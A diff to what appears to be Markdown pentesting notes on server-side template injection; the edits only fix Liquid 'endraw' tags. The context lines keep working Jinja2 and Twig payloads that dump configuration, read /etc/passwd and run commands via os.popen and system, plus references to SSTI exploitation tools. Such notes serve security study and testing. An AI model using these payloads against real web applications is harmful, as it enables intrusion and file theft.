@@ -25,7 +25,7 @@ For-loop over all elements in the `names` variable (if is like `names=["name", "
 Hello {{ name }}!
 {% endfor %}
 ```
-{% rawend %}
+{% endraw %}
 ## Confirming SSTI
 The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior.
 Example:
@@ -33,7 +33,7 @@ Example:
 ```
 ${{<%[%'"}}%\.
 ```
-{% rawend %}
+{% endraw %}
 ## Identifying the Template Engine
 We can utilize slight variations in the behavior of different template engines. We can use this decision tree by following the green sign in case of successful code execution and the red cross in case of the payload wasn't executed:
 {% raw %}
@@ -61,26 +61,26 @@ Payload to dump the entire web application configuration:
 ```
 {{ config.items() }}
 ```
-{% rawend %}
+{% endraw %}
 Payload to dump all available built-in functions:
 {% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__ }}
 ```
-{% rawend %}
+{% endraw %}
 ### Local File Inclusion (LFI)
 {% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
-{% rawend %}
+{% endraw %}
 ### Remote Code Execution (RCE)
 We can use functions provided by the os library, such as system or popen. However, if the web application has not already imported this library, we must first import it by calling the built-in function import:
 {% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
-{% rawend %}
+{% endraw %}
 ## Exploiting SSTI in Twig
 ### Information Disclosure
 Payload to get information about the current template:
@@ -88,20 +88,20 @@ Payload to get information about the current template:
 ```
 {{ _self }}
 ```
-{% rawend %}
+{% endraw %}
 ### Local File Inclusion (LFI)
 The PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files:
 {% raw %}
 ```
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
 ```
-{% rawend %}
+{% endraw %}
 ### Remote Code Execution (RCE)
 {% raw %}
 ```
 {{ ['id'] | filter('system') }}
 ```
-{% rawend %}
+{% endraw %}
 ## Tools of the Trade
 Popular tools for identifying and exploiting SSTI vulnerabilities are [tplmap](https://github.com/epinna/tplmap) and [SSTImap](https://github.com/vladko312/SSTImap).
 ### SSTImap
